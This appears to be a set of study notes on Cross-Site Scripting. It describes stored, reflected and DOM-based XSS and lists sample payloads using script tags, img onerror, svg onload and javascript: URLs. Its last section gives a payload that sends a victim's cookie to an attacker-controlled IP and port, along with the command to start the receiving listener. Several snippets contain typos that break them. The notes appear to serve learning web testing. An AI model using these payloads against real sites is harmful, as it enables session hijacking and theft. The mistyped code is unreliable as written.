Cross-Site Scripting (XSS) is a type of security vulnerability commonly found in web applications. It occurs when an attacker injects malicious code, usually in the form of scripts, into a web page or application, which is then executed by unsuspecting users who visit that page. The injected code can steal sensitive data, manipulate web content, or perform actions on behalf of the user without their consent.

There are three main types of XSS attacks:

1. **Stored XSS:** The malicious code is permanently stored on a server and is served to multiple users when they access a specific page or resource. This type of XSS can have a long-lasting impact as it affects all subsequent visitors to the compromised page.
    
2. **Reflected XSS:** In this case, the injected code is reflected off a web server and immediately executed in response to a user's request. Typically, the attacker tricks the user into clicking on a malicious link containing the payload.
    
3. **DOM-based XSS:** This type of XSS occurs when the client-side script in a web page manipulates the Document Object Model (DOM) without proper sanitization or validation, allowing an attacker to execute malicious code on the client-side.
# Basic script
```bash
<script>alert("hi")</script>
```

# Image script
With this type of script we are trying to upload an image, but providing a wrong source. We generate this error on purpose to execute the *onerror* javascript function that prints hi in a pop-upp suing alert.
```bash
<img src='x' onerror=alert("hi") />
```

Also, we can use the onclick javascript's function. If we upload an image with a valid source when we click the image it will spawn the pop-up with the alert message.
```bash
<img src"<valid url>" onclick=alert("hi") />
```

# SVG script
When this code is injected into a web page, the SVG image will be loaded, and as soon as it's loaded, the `onload` event will fire, executing the JavaScript code and displaying the "1" in a pop-up alert box. It uses an SVG (Scalable Vector Graphics) element to trigger the JavaScript alert.

```bash
<svg onload=alert(1)>
```

- Example:
If we are attacking a web where whatever you insert will be assigned to the variable query, this option of XSS could be useful.
```bash
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}

QUERY="><svg onload=alert(1)>
```

# DOM XSS using an anchor in jQuery
```bash
javascript:alert(document.cookie)
```
The code executes on the client side, within the user's browser. It doesn't rely on the server processing user input or delivering malicious content in the server response. Instead, it relies on manipulating the Document Object Model (DOM) of the current web page.

If an attacker can inject this code into a web page by manipulating user-generated content (e.g., through input fields or URLs), the injected code will execute within the user's browser. For example, an attacker might craft a URL like `https://example.com/?input=javascript:alert(document.cookie)` and trick a user into clicking it.

# Obtaining Cookie
If we can introduce XSS code into a petition that will be processed by the administration server, we can try to obtain it's cookie by running the following code: 
```bash
<img src'x' onerror=fetch('http://<own-ip>:<port>/+document.cookie);>
```
With this petition we induce the victim server to execute JS code. With this code the server tries to execute  a wrong image and on the error sends it's cookie to our machine. Before executing this payload is necessary to open a local port.
```bash
pyton3 -m http.server 80
```